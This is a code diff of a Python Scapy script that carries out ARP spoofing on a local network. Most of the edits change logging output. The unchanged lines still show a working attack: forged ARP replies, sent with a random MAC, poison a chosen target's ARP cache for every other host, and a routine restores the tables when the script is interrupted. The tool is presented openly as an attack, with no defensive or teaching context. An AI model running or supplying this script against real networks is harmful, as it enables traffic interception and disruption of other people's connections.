@@ -3,7 +3,6 @@ import time
 import sys
 import argparse
 import random
-from pprint import pprint
 
 def rand_mac():
     common_ouis = [
@@ -52,7 +51,6 @@ def spoof(from_mac, from_ip,to_ip,interface, devices):
     packet = Ether(dst=to_mac, src=from_mac) / \
              ARP(op=2, pdst=to_ip, hwdst=to_mac, psrc=from_ip, hwsrc=from_mac)
     sendp(packet, count=3, inter=0.2, iface=interface, verbose=0)
-    print(f"[*] Sent to {to_ip}={to_mac} from {from_ip}-{from_mac}")
     return
 
 def restore(ip, iface, devices):
@@ -62,11 +60,11 @@ def restore(ip, iface, devices):
         packet = Ether(dst=to_mac, src=from_mac) / \
                  ARP(op=2, pdst=ip, hwdst=to_mac, psrc=from_ip, hwsrc=from_mac)
         sendp(packet, count=3, inter=0.2, iface=iface, verbose=0)
-        print(f"[*] Restored {ip}={to_mac} from {from_ip}-{from_mac}")
     return
 
 def start_attack(to_ip, iface,devices):
     mac= unique_rand_mac(devices)
+    print(f"[*] Spoofing with MAC {mac}")
     for from_ip in devices.keys():
         if from_ip!= to_ip: spoof(mac, from_ip, to_ip, iface, devices)
     return
@@ -89,11 +87,13 @@ if __name__ == "__main__":
     try:
         print(f"[*] Starting ARP attack on {args.target}")
         devices = scan()
-        
-        pprint(f"[*] Devices on Network: {devices}")
-        
+            
         if ip not in devices: 
             print(f"[*] Target {ip} not found in network")
+            print(f"[*] Devices on Network: ")
+            print("IP\t\t\tMAC")
+            for ip, mac in devices.items():
+                print(f"{ip}\t{mac}")
             sys.exit(0)
         
         while True:
@@ -103,4 +103,5 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("\n[*] Restoring ARP tables")
         restore(ip, iface,devices)
+        print("[*] ARP tables restored")
         sys.exit(0)
